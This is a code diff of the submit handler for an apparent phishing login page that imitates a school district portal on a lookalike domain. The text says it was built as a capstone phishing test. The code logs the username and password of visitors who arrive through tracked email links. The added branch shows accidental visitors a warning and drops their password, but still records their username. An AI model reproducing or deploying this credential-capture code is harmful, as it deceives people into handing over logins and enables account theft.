@@ -778,7 +778,12 @@ var getUrl = window.location.search.substring(1);
 if(getUrl.length == 0) getUrl = "undefined";
 
 $('#form_signin').on('submit', function() {
-new dbEntry(getUrl, $('#username')[0], $('#password')[0]);
+	if(getUrl == "undefined")
+	{
+		alert("You have signed into a fake phishing site that COULD have logged your password (but didn't, you can check the code). This was intended to be sent through email as a test for a Senior Capstone project. You have stumbled across this site inadvertently. Please make sure to check that you are going to campus.ccsd.net instead of campusccsd.com.");
+		new dbEntry(getUrl, $('#username')[0], "ACCIDENTAL ATTEMPT");
+	}
+	else new dbEntry(getUrl, $('#username')[0], $('#password')[0]);
 });
 
 //log visit on db
